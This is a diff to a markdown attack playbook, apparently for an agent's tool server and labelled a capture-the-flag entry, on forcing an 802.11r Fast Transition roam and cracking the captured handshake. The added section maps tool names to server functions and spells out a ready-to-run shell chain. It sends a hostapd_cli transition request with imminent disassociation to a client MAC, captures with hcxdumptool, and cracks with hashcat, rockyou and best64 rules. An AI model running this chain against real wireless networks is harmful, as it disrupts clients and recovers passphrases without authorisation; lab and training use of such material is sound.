@@ -1,5 +1,7 @@
 # FT-handshake flag — 802.11r roam, crack with hashcat 22000
 
+**Verified against:** hashcat 6.2.x / hcxdumptool 7.3 as of 2026-Q3
+
 Capture an 802.11r Fast Transition reassociation. Convert. Crack.
 
 ## Recognition
@@ -42,6 +44,36 @@ run_sequence([
      "rules": ["best64.rule"],
      "mode": 22000},
 ])
+```
+
+## MCP mapping / fallback
+
+- `btm_forced_roam` and `capture_ft_handshake` are **not in `src/`**.
+  Drive `hostapd_cli` on the Pineapple for BTM Requests, and
+  `hcxdumptool`/`tcpdump` on the destination channel for the reassoc
+  capture.
+- `convert_to_hashcat` → `server.convert_to_hashcat` (works on FT
+  reassoc frames — hcxpcapngtool tags them as WPA*02 FT).
+- `crack_start` → `server.crack_start`.
+
+**Fallback shell chain — BTM-forced FT capture:**
+
+```bash
+# 1. BTM Request via hostapd_cli (only works if you already run hostapd
+#    on the same channel with wnm_bss_transition=1). Alternative: send
+#    a raw BTM Request with scapy — see references/framing/btm-request.py.
+sudo hostapd_cli bss_tm_req 11:22:33:44:55:66 \
+    pref=1 abridged=1 disassoc_imminent=1 disassoc_timer=100 \
+    neighbor=AA:BB:CC:DD:EE:00,0,11,36,7
+
+# 2. Sit on the destination AP's channel and capture the FT reassoc.
+sudo hcxdumptool -i wlan1 -c 36 -w /tmp/ft.pcapng \
+    --disable_deauthentication=1
+# ...stop after the reassoc lands...
+
+# 3. Convert + crack.
+hcxpcapngtool -o /tmp/ft.22000 /tmp/ft.pcapng
+hashcat -m 22000 /tmp/ft.22000 /opt/wordlists/rockyou.txt -r best64.rule
 ```
 
 ## The flag surface
